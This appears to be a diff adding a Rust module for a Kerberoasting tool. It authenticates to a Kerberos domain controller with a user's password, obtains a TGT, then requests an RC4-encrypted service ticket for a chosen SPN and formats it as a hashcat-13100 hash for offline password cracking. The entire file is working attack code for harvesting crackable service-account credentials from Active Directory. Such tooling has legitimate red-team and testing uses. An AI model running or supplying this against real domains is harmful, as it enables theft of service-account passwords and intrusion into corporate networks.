@@ -1,0 +1,210 @@
+//! Kerberoast: authenticated TGS-REQ path.
+//!
+//! Flow (all etype negotiation done with AES256 for the *client* key, since modern DCs
+//! store AES keys for users):
+//!   1. `get_tgt` — AS-REQ **with** PA-ENC-TIMESTAMP (proves knowledge of the password),
+//!      decrypt the AS-REP enc-part to recover the TGT session key + the TGT itself.
+//!   2. `roast_spn` — build an AP-REQ (authenticator encrypted under the session key),
+//!      wrap it in a TGS-REQ for the target SPN, and extract the returned *service
+//!      ticket* enc-part — the crackable Kerberoast material.
+//!
+//! The TGS-REQ requests an RC4 service ticket (etype 23) so the result is the canonical
+//! hashcat-13100 hash. AES-only service accounts return etype 18 and are reported as such.
+
+use crate::{format_tgs, kdc_exchange, krb_string, now_kerberos_time, principal, ETYPE_RC4_HMAC};
+use anyhow::{anyhow, bail, Result};
+
+use picky_asn1::bit_string::BitString;
+use picky_asn1::wrapper::{
+    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2,
+    ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5, ExplicitContextTag7,
+    ExplicitContextTag8, IntegerAsn1, OctetStringAsn1, Optional,
+};
+use picky_krb::constants::key_usages::{AS_REP_ENC, TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR};
+use picky_krb::constants::types::{
+    AP_REQ_MSG_TYPE, AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, PA_ENC_TIMESTAMP_KEY_USAGE,
+    TGS_REQ_MSG_TYPE,
+};
+use picky_krb::crypto::{Cipher, CipherSuite};
+use picky_krb::data_types::{
+    Authenticator, AuthenticatorInner, EncryptedData, PaData, PaEncTsEnc, PrincipalName, Ticket,
+};
+use picky_krb::messages::{
+    ApReq, ApReqInner, AsRep, AsReq, EncAsRepPart, KdcReq, KdcReqBody, TgsRep, TgsReq,
+};
+
+/// Ticket-Granting Ticket plus the material needed to use it.
+pub struct Tgt {
+    ticket: Ticket,
+    session_key: Vec<u8>,
+    cname: PrincipalName,
+    crealm: String,
+}
+
+fn aes256() -> Box<dyn Cipher> {
+    CipherSuite::Aes256CtsHmacSha196.cipher()
+}
+
+fn encrypted_data(etype: u8, cipher: Vec<u8>) -> EncryptedData {
+    EncryptedData {
+        etype: ExplicitContextTag0::from(IntegerAsn1(vec![etype])),
+        kvno: Optional::from(None),
+        cipher: ExplicitContextTag2::from(OctetStringAsn1(cipher)),
+    }
+}
+
+fn kdc_options() -> BitStringAsn1 {
+    // forwardable | renewable | canonicalize
+    BitStringAsn1::from(BitString::with_bytes(vec![0x40, 0x81, 0x00, 0x00]))
+}
+
+fn nonce() -> IntegerAsn1 {
+    let mut n = [0u8; 4];
+    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut n);
+    n[0] &= 0x7f;
+    IntegerAsn1(n.to_vec())
+}
+
+/// AS-REQ with PA-ENC-TIMESTAMP, then recover the TGT + session key from the AS-REP.
+pub async fn get_tgt(user: &str, password: &str, realm: &str, kdc: &str) -> Result<Tgt> {
+    let realm = realm.to_uppercase();
+    let cipher = aes256();
+    // AD AES salt = UPPERCASE(realm) + sAMAccountName.
+    let salt = format!("{realm}{user}");
+    let key = cipher
+        .generate_key_from_password(password.as_bytes(), salt.as_bytes())
+        .map_err(|e| anyhow!("derive AES key: {e}"))?;
+
+    // PA-ENC-TIMESTAMP: encrypted current time proving password knowledge.
+    let ts = PaEncTsEnc {
+        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
+        pausec: Optional::from(None),
+    };
+    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
+    let enc_ts = cipher
+        .encrypt(&key, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der)
+        .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
+    let pa_ts_der = picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts))
+        .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?;
+    let padata = PaData {
+        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])), // PA-ENC-TIMESTAMP
+        padata_data: ExplicitContextTag2::from(OctetStringAsn1(pa_ts_der)),
+    };
+
+    let body = KdcReqBody {
+        kdc_options: ExplicitContextTag0::from(kdc_options()),
+        cname: Optional::from(Some(ExplicitContextTag1::from(principal(NT_PRINCIPAL, &[user])))),
+        realm: ExplicitContextTag2::from(krb_string(&realm)),
+        sname: Optional::from(Some(ExplicitContextTag3::from(principal(NT_SRV_INST, &["krbtgt", &realm])))),
+        from: Optional::from(None),
+        till: ExplicitContextTag5::from(now_kerberos_time()),
+        rtime: Optional::from(None),
+        nonce: ExplicitContextTag7::from(nonce()),
+        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![crate::ETYPE_AES256])])),
+        addresses: Optional::from(None),
+        enc_authorization_data: Optional::from(None),
+        additional_tickets: Optional::from(None),
+    };
+    let as_req = AsReq::from(KdcReq {
+        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
+        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
+        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(vec![padata])))),
+        req_body: ExplicitContextTag4::from(body),
+    });
+
+    let raw = picky_asn1_der::to_vec(&as_req).map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
+    let resp = kdc_exchange(kdc, &raw).await?;
+    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp)
+        .map_err(|e| anyhow!("AS-REP decode (wrong password / pre-auth failure?): {e}"))?;
+
+    // Decrypt the AS-REP enc-part (client key, usage 3) to get the session key.
+    let enc = &as_rep.0.enc_part.0;
+    let plain = cipher
+        .decrypt(&key, AS_REP_ENC, &enc.cipher.0 .0)
+        .map_err(|e| anyhow!("decrypt AS-REP (bad password?): {e}"))?;
+    let enc_part: EncAsRepPart =
+        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
+    let session_key = enc_part.0.key.0.key_value.0 .0.clone();
+
+    Ok(Tgt {
+        ticket: as_rep.0.ticket.0.clone(),
+        session_key,
+        cname: as_rep.0.cname.0.clone(),
+        crealm: realm,
+    })
+}
+
+/// Build a TGS-REQ for `spn` using the TGT, and return the crackable service-ticket hash.
+pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<String> {
+    let session = aes256();
+
+    // Authenticator, encrypted under the TGT session key (usage 7).
+    let authenticator = Authenticator::from(AuthenticatorInner {
+        authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
+        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)),
+        cname: ExplicitContextTag2::from(tgt.cname.clone()),
+        cksum: Optional::from(None),
+        cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
+        ctime: ExplicitContextTag5::from(now_kerberos_time()),
+        subkey: Optional::from(None),
+        seq_number: Optional::from(None),
+        authorization_data: Optional::from(None),
+    });
+    let auth_der = picky_asn1_der::to_vec(&authenticator).map_err(|e| anyhow!("encode authenticator: {e}"))?;
+    let enc_auth = session
+        .encrypt(&tgt.session_key, TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR, &auth_der)
+        .map_err(|e| anyhow!("encrypt authenticator: {e}"))?;
+
+    // AP-REQ carrying the TGT + encrypted authenticator.
+    let ap_req = ApReq::from(ApReqInner {
+        pvno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
+        msg_type: ExplicitContextTag1::from(IntegerAsn1(vec![AP_REQ_MSG_TYPE])),
+        ap_options: ExplicitContextTag2::from(BitStringAsn1::from(BitString::with_bytes(vec![0, 0, 0, 0]))),
+        ticket: ExplicitContextTag3::from(tgt.ticket.clone()),
+        authenticator: ExplicitContextTag4::from(encrypted_data(crate::ETYPE_AES256, enc_auth)),
+    });
+    let ap_der = picky_asn1_der::to_vec(&ap_req).map_err(|e| anyhow!("encode AP-REQ: {e}"))?;
+    let pa_tgs = PaData {
+        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x01])), // PA-TGS-REQ
+        padata_data: ExplicitContextTag2::from(OctetStringAsn1(ap_der)),
+    };
+
+    // SPN → sname (split service class / instance on '/').
+    let parts: Vec<&str> = spn.split('/').collect();
+    let sname = principal(NT_SRV_INST, &parts);
+
+    let body = KdcReqBody {
+        kdc_options: ExplicitContextTag0::from(kdc_options()),
+        cname: Optional::from(None), // identity comes from the ticket
+        realm: ExplicitContextTag2::from(krb_string(&tgt.crealm)),
+        sname: Optional::from(Some(ExplicitContextTag3::from(sname))),
+        from: Optional::from(None),
+        till: ExplicitContextTag5::from(now_kerberos_time()),
+        rtime: Optional::from(None),
+        nonce: ExplicitContextTag7::from(nonce()),
+        // Prefer an RC4 service ticket ⇒ hashcat 13100.
+        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![ETYPE_RC4_HMAC])])),
+        addresses: Optional::from(None),
+        enc_authorization_data: Optional::from(None),
+        additional_tickets: Optional::from(None),
+    };
+    let tgs_req = TgsReq::from(KdcReq {
+        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
+        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![TGS_REQ_MSG_TYPE])),
+        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(vec![pa_tgs])))),
+        req_body: ExplicitContextTag4::from(body),
+    });
+
+    let raw = picky_asn1_der::to_vec(&tgs_req).map_err(|e| anyhow!("encode TGS-REQ: {e}"))?;
+    let resp = kdc_exchange(kdc, &raw).await?;
+    let tgs_rep: TgsRep = picky_asn1_der::from_bytes(&resp)
+        .map_err(|e| anyhow!("TGS-REP decode (KDC error): {e}"))?;
+
+    // The crackable material is the *service ticket* enc-part.
+    let tkt_enc = &tgs_rep.0.ticket.0 .0.enc_part.0;
+    let etype = tkt_enc.etype.0 .0.iter().fold(0u32, |a, &b| (a << 8) | b as u32);
+    if etype != ETYPE_RC4_HMAC as u32 {
+        bail!("service ticket came back etype {etype} (AES) — RC4 hash unavailable for {spn}");
+    }
+    Ok(format_tgs(sam, &tgt.crealm, spn, &tkt_enc.cipher.0 .0))
+}
